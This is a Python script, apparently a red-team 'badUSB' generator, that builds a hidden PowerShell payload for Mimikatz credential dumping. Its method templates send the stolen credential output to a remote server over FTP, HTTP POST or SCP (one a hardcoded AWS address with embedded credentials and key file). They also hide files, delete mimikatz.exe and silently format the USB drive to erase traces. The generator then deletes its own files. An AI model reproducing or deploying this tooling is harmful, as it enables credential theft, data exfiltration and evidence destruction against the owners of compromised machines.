#!/usr/bin/env python

# Imported modules
import argparse
import ipaddress
import os 
import subprocess

# Function to read a file and replace text
def replace_text_in_file(input_file, output_file, replacements):
    with open(input_file, 'r') as infile, open(output_file, 'w') as outfile:
        for line in infile:
            for old_str, new_str in replacements.items():
                line = line.replace(old_str, new_str)
            outfile.write(line)


#command sets for different methods
method_commands = {
    "LOCAL": """

# Construct the full path of the destination on the USB drive
$destinationPath = Join-Path -Path $scriptDirectoryOnUsb -ChildPath $filename

# Move the output file to the USB drive location
Move-Item -Path $outputFilePath2 -Destination $destinationPath

# Set the output file as hidden using .NET methods
$fileAttributes = [System.IO.FileAttributes]::Hidden
[System.IO.File]::SetAttributes($outputFileInDownloads, $fileAttributes)

# Display a message indicating the completion of the process (to show file was been moved) 
Write-Host "Mimikatz output has been saved to: $destinationPath"

# Delete the mimikatz.exe from the temporary folder
Remove-Item -Path $mimikatzExePath -Force

# Wait for a few seconds before closing the PowerShell session (optional)
Start-Sleep -Seconds 4

# Stop any running background jobs
Get-Job | Stop-Job

""",

    "FTP": r"""
#ftp upload
# FTP server details
$ftpServer = "ip_address"
$ftpUsername = ftp_username
$ftpPassword = ftp_password

# Define the source file path (USB drive) and destination folder (system's temp folder)
$sourceFilePath = Join-Path -Path $PSScriptRoot -ChildPath "cdf-rtg.pem"
$destinationFolder = $env:TEMP

# Construct the full destination file path
$destinationFilePath = Join-Path -Path $destinationFolder -ChildPath "cdf-rtg.pem"

# Use the Move-Item cmdlet to move the file
Move-Item -Path $sourceFilePath -Destination $destinationFilePath

$pemFileName = "cdf-rtg.pem"
$ftpPrivateKeyPath = Join-Path $env:temp $pemFileName

$ftpServer = "54.255.168.44"
$ftpUsername = "ftptester"
$ftpPassword = "ftptester"  # Since the .pem file is passwordless, you can use any password here

# Set up the credentials with the .pem file
$credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
$certificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($ftpPrivateKeyPath)
$credentials.ClientCertificates.Add($certificate)
$webClient.Credentials = $credentials

# Local file path (ensure $filename is defined)
$localFilePath = Join-Path -Path $env:TEMP -ChildPath $filename

# Remote destination directory on the FTP server
$remoteDirectory = "/uploads"

# Specify the remote file name
$remoteFileName = "kopi.txt"

# Create a WebClient object
$webClient = New-Object System.Net.WebClient

# Set credentials for the FTP server
$webClient.Credentials = $credentials

# Set the FTP upload URL
$ftpUploadUrl = "ftp://$ftpServer$remoteDirectory/$remoteFileName"

try {
    # Upload the file to the FTP server
    $webClient.UploadFile($ftpUploadUrl, $localFilePath)
    Write-Host "File $($localFilePath) uploaded successfully to $($ftpServer)$($remoteDirectory)"
} catch {
    Write-Host "Error uploading file: $_.Exception.Message"
} finally {
    # Dispose of the WebClient object
    $webClient.Dispose()
}

# Get all drives
$drives = Get-WmiObject Win32_DiskDrive

foreach ($drive in $drives) {
    $partitions = Get-WmiObject -Query "ASSOCIATORS OF {Win32_DiskDrive.DeviceID='$($drive.DeviceID)'} WHERE AssocClass=Win32_DiskDriveToDiskPartition"

    foreach ($partition in $partitions) {
        $volumes = Get-WmiObject -Query "ASSOCIATORS OF {Win32_DiskPartition.DeviceID='$($partition.DeviceID)'} WHERE AssocClass=Win32_LogicalDiskToPartition"
        
        foreach ($volume in $volumes) {
            if ($volume.DriveType -eq 2) {
                # DriveType 2 indicates that it's a removable drive (USB drive)
                $driveLetter = $volume.DeviceID
                # Format the USB drive with NTFS filesystem (you can change it to FAT32 or exFAT if needed)
                Format-Volume -DriveLetter $driveLetter -FileSystem NTFS -Confirm:$false
                Write-Host "USB drive with drive letter $driveLetter has been formatted."
                return
            }
        }
    }
}

Write-Host "No removable drives found."

""",

    "HTTP": """
$boundary = [System.Guid]::NewGuid().ToString()
$FilePath = [System.IO.Path]::Combine($env:TEMP, "Mimikatz_Output.txt")
$TheFile = [System.IO.File]::ReadAllBytes($FilePath)
$TheFileContent = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($TheFile)

$LF = "`r`n"
$bodyLines = (
    "--$boundary",
    "Content-Disposition: form-data; name=`"Description`"$LF",
    "This is a file I'm uploading",
    "--$boundary",
    "Content-Disposition: form-data; name=`"files`"; filename=`"Mimikatz_Output.txt`"",
    "Content-Type: application/json$LF",
    $TheFileContent,
    "--$boundary--$LF"
) -join $LF

Invoke-RestMethod 'http://ip_address:port/upload' -Method POST -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines

# Get all drives
$drives = Get-WmiObject Win32_DiskDrive

foreach ($drive in $drives) {
    $partitions = Get-WmiObject -Query "ASSOCIATORS OF {Win32_DiskDrive.DeviceID='$($drive.DeviceID)'} WHERE AssocClass=Win32_DiskDriveToDiskPartition"

    foreach ($partition in $partitions) {
        $volumes = Get-WmiObject -Query "ASSOCIATORS OF {Win32_DiskPartition.DeviceID='$($partition.DeviceID)'} WHERE AssocClass=Win32_LogicalDiskToPartition"
        
        foreach ($volume in $volumes) {
            if ($volume.DriveType -eq 2) {
                # DriveType 2 indicates that it's a removable drive (USB drive)
                $driveLetter = $volume.DeviceID
                # Format the USB drive with NTFS filesystem (you can change it to FAT32 or exFAT if needed)
                Format-Volume -DriveLetter $driveLetter -FileSystem NTFS -Confirm:$false
                Write-Host "USB drive with drive letter $driveLetter has been formatted."
                return
            }
        }
    }
}

Write-Host "No removable drives found."

""",

    "SCP": """
    
# Define the source file path (USB drive) and destination folder (system's temp folder)
$sourceFilePath = Join-Path -Path $PSScriptRoot -ChildPath "cdf-rtg.pem"
$destinationFolder = $env:TEMP

# Construct the full destination file path
$destinationFilePath = Join-Path -Path $destinationFolder -ChildPath "cdf-rtg.pem"

# Use the Move-Item cmdlet to move the file
Move-Item -Path $sourceFilePath -Destination $destinationFilePath

#send the output file to aws ec2 instance ssh server
scp -i cdf-rtg.pem Mimikatz_Output.txt ec2-user@ec2-54-255-168-44.ap-southeast-1.compute.amazonaws.com:hello

# Get all drives
$drives = Get-WmiObject Win32_DiskDrive

foreach ($drive in $drives) {
    $partitions = Get-WmiObject -Query "ASSOCIATORS OF {Win32_DiskDrive.DeviceID='$($drive.DeviceID)'} WHERE AssocClass=Win32_DiskDriveToDiskPartition"

    foreach ($partition in $partitions) {
        $volumes = Get-WmiObject -Query "ASSOCIATORS OF {Win32_DiskPartition.DeviceID='$($partition.DeviceID)'} WHERE AssocClass=Win32_LogicalDiskToPartition"
        
        foreach ($volume in $volumes) {
            if ($volume.DriveType -eq 2) {
                # DriveType 2 indicates that it's a removable drive (USB drive)
                $driveLetter = $volume.DeviceID
                # Format the USB drive with NTFS filesystem (you can change it to FAT32 or exFAT if needed)
                Format-Volume -DriveLetter $driveLetter -FileSystem NTFS -Confirm:$false
                Write-Host "USB drive with drive letter $driveLetter has been formatted."
                return
            }
        }
    }
}

Write-Host "No removable drives found."

""",
}


# Create an ArgumentParser object
parser = argparse.ArgumentParser(description='a tool to auto-generate badUSB powershell script (mimikatz)')

# Add command-line arguments
parser.add_argument("-m", "--method", type=str, choices=["LOCAL", "FTP", "HTTP", "SCP"], required=True,
                    help="Method to use: LOCAL/FTP/HTTP/SCP")
parser.add_argument("-p", "--port", type=int, default=None,
                    help="Port number for your FTP/HTTP server (0-65535)")
parser.add_argument("-i", "--IPAddress", type=str, default=None,
                    help="IP address of your FTP/HTTP server")

parser.add_argument("-U", "--ftp_username", type=str, default="ftptester", help="FTP username")
parser.add_argument("-P", "--ftp_password", type=str, default="ftptester", help="FTP password")


# Parse the command-line arguments
args = parser.parse_args()

# Access the values of the arguments
method = args.method
port = args.port
ip_address = args.IPAddress
ftp_username = args.ftp_username
ftp_password = args.ftp_password


# If method is LOCAL, port and IP address will be set to default value
if method == "LOCAL":
    if port is None:
        port = "none"  # Set a default port number for LOCAL method
    if ip_address is None:
        ip_address = "localhost"  # Set a default IP address for LOCAL method

# Ensure port and IP address are provided when user choose a non-LOCAL method 
if method in ["FTP", "HTTP"]:
    if port is None or ip_address is None:
        parser.error("For FTP, HTTP methods, both port and IP Address are required.")
    
    # Validate the IP address using the ipaddress module
    try:
        ipaddress.IPv4Address(ip_address)
    except ipaddress.AddressValueError:
        parser.error("Invalid IPv4 address. Please provide a valid IPv4 address.")

# if FTP method is chosen, user is required to enter his/her own ftp server password and username, if no input found it will be set to the default value 
if method == "FTP":
    if ftp_username is None or ftp_password is None:
        parser.error("For FTP method, both FTP username and FTP password are required.")


# Now you can use these variables in your script
print(f"Method: {method}")
print(f"Port: {port}")
print(f"IP Address: {ip_address}")

if method == "FTP":
    print(f"FTP Username: {ftp_username}")
    print(f"FTP Password: {ftp_password}")

# Get the corresponding set of commands based on the chosen method
method_commands = method_commands.get(method, "")

# Define the template file path and output file path
template_file = 'script_template.ps1'
badscript = 'BadUSB_script.py'
output_folder = 'secret'  # Specify the folder where you want to save the file
output_file = os.path.join(output_folder,'mimi.ps1')  # Combine the folder and filename

# Replace the 'methods' placeholder in the PowerShell script template with the commands
replacements = {
    'methods': method_commands,
    'ip_address': str(ip_address),
    'port': str(port),
    'ftp_username': ftp_username,
    'ftp_password': ftp_password
}

# Replace the text and save the modified script as a new file
replace_text_in_file(template_file, output_file, replacements)

# Change the file attributes to make it hidden
if os.name == 'nt':  # Check if the OS is Windows
    try:
        subprocess.run(['attrib', '+h', output_file], check=True, shell=True)
        print(f"PowerShell script has been generated and saved as a hidden file.")
    except Exception as e:
        print(f"Error setting file as hidden: {str(e)}")

os.remove(template_file)
os.remove(badscript)

# Inform the user about the script generation and its location
print(f"PowerShell script has been generated and saved to {os.path.abspath (output_file)}")